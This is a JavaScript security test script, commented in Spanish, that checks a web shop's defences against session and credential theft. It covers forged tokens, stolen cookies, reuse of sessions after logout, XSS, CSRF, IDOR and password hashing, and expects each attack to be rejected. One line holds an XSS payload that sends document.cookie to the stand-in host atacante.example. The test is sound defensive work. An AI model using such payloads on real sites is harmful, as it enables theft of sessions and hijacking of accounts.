// ATAQUE 3 · ROBO DE CREDENCIALES Y DE SESIÓN
// Formas de quedarse con la cuenta de alguien sin saber su contraseña:
//   a) fabricar un token (la versión anterior usaba Base64 "cliente:1:...")
//   b) copiar la cookie de la víctima y usarla en otro navegador
//   c) reusar una sesión después de que la víctima cerró sesión
//   d) inyectar un script (XSS) para leer la cookie y mandarla fuera
//   e) hacer que la víctima mande una petición desde otro sitio (CSRF)
//   f) ver los datos de otro cliente cambiando el id (IDOR)
//   g) robar la base: las contraseñas solo están como hash bcrypt
//
//   npm run prueba:sesion
const { titulo, paso, info, verificar, resumen, navegador, servidorArriba, C } = require('./comun');

const VICTIMA = { correo: 'sofia@correo.com', password: 'Demo#KZ2026' };

(async () => {
    await servidorArriba();

    titulo('a) Token fabricado');
    const falso = Buffer.from('cliente:1:' + Date.now()).toString('base64');
    let r = await navegador().get('/api/auth/perfil', { headers: { Authorization: 'Bearer ' + falso } });
    verificar('Un token Base64 "cliente:1:..." inventado no da acceso', r.status === 401, `${r.status}`);
    r = await navegador().get('/api/auth/perfil', { headers: { Cookie: 'kz_sesion=' + 'A'.repeat(43) } });
    verificar('Una cookie aleatoria con el formato correcto tampoco', r.status === 401, `${r.status}`);

    titulo('b) Cookie copiada a otro navegador');
    const victima = navegador('Mozilla/5.0 (Windows NT 10.0) Chrome/130 Victima');
    r = await victima.login({ tipo: 'cliente', ...VICTIMA });
    verificar('La víctima inicia sesión normal', r.status === 200);
    const cookie = victima.jar.kz_sesion;
    info(`Cookie de la víctima: kz_sesion=${String(cookie).slice(0, 12)}… (HttpOnly: el JavaScript de la página no la puede leer)`);
    const atacante = navegador('Mozilla/5.0 (X11; Linux) Firefox/131 Atacante');
    r = await atacante.get('/api/auth/perfil', { headers: { Cookie: 'kz_sesion=' + cookie } });
    verificar('El atacante con la cookie robada es rechazado', r.status === 401, `${r.status}`);
    r = await victima.get('/api/auth/perfil');
    verificar('La sesión robada quedó revocada (la víctima vuelve a iniciar sesión)', r.status === 401,
        'el servidor la cierra al detectar el uso desde otro navegador');

    titulo('c) Reusar una sesión cerrada');
    const v2 = navegador('Mozilla/5.0 Chrome/130 Victima2');
    await v2.login({ tipo: 'cliente', ...VICTIMA });
    const vieja = v2.jar.kz_sesion;
    await v2.post('/api/auth/logout', { tipo: 'cliente' });
    r = await navegador('Mozilla/5.0 Chrome/130 Victima2').get('/api/auth/perfil', { headers: { Cookie: 'kz_sesion=' + vieja } });
    verificar('Después de "Cerrar sesión" la cookie copiada ya no sirve', r.status === 401, `${r.status}`);

    titulo('d) XSS para robar la cookie');
    const v3 = navegador('Mozilla/5.0 Chrome/130 Victima3');
    await v3.login({ tipo: 'cliente', ...VICTIMA });
    const carga = '<img src=x onerror="fetch(\'https://atacante.example/?c=\'+document.cookie)">';
    r = await v3.post('/api/atencion/ticket', { categoria: 'general', mensaje: 'Hola, tengo una duda con mi pedido ' + carga });
    const guardado = r.json && r.json.ticket ? r.json.ticket.mensaje : '';
    verificar('El HTML del ataque se elimina antes de guardarse', r.status === 201 && !/<img|onerror="/i.test(guardado), `se guardó: ${guardado.slice(0, 60)}`);
    const cab = await navegador().get('/');
    const csp = cab.headers.get('content-security-policy') || '';
    verificar('CSP: un script inyectado no puede mandar datos a otro servidor', /connect-src 'self'/.test(csp));
    const setCookie = (await navegador().login({ tipo: 'cliente', ...VICTIMA })).headers.get('set-cookie') || '';
    verificar('La cookie de sesión es HttpOnly y SameSite=Strict', /HttpOnly/i.test(setCookie) && /SameSite=Strict/i.test(setCookie));

    titulo('e) CSRF: petición desde otro sitio');
    r = await v3.post('/api/monedero/recargar', { monto: 100, metodo: 'paypal', paypal_correo: 'x@y.com' }, { headers: { Origin: 'https://sitio-malicioso.example' } });
    verificar('Una petición con origen ajeno se rechaza', r.status === 403, `${r.status}`);

    titulo('f) Ver datos de otro cliente (IDOR)');
    r = await v3.get('/api/clientes/1');
    verificar('No puede ver el perfil de otro cliente', r.status === 403, `${r.status}`);
    r = await v3.get('/api/pedidos/1/detalle');
    verificar('No puede ver pedidos de otro cliente', r.status === 404 || r.status === 403, `${r.status}`);
    r = await v3.get('/api/carrito/1');
    verificar('No puede ver el carrito de otro cliente', r.status === 403, `${r.status}`);

    titulo('g) Si se roban la base de datos');
    try {
        const { Pool } = require('pg');
        const { usaValoresPorDefecto, ...cfg } = require('../db.config.js');
        const pool = new Pool(cfg);
        const c = await pool.query(`SELECT correo, password FROM clientes WHERE correo = $1`, [VICTIMA.correo]);
        const s = await pool.query(`SELECT token_hash FROM sesiones ORDER BY id DESC LIMIT 1`);
        await pool.end();
        info(`clientes.password = ${c.rows[0].password.slice(0, 29)}…`);
        verificar('La contraseña está cifrada con bcrypt (no se puede leer)', /^\$2[aby]\$\d\d\$/.test(c.rows[0].password));
        verificar('En la tabla sesiones solo está el hash SHA-256 del token', /^[0-9a-f]{64}$/.test(s.rows[0].token_hash));
    } catch (e) {
        console.log(`${C.aviso}  (se omite: no se pudo leer la base: ${e.message})${C.fin}`);
    }
    info('En el panel: Cuenta → Seguridad → Eventos (sesión robada, token inválido, CSRF, XSS).');
    resumen();
})();
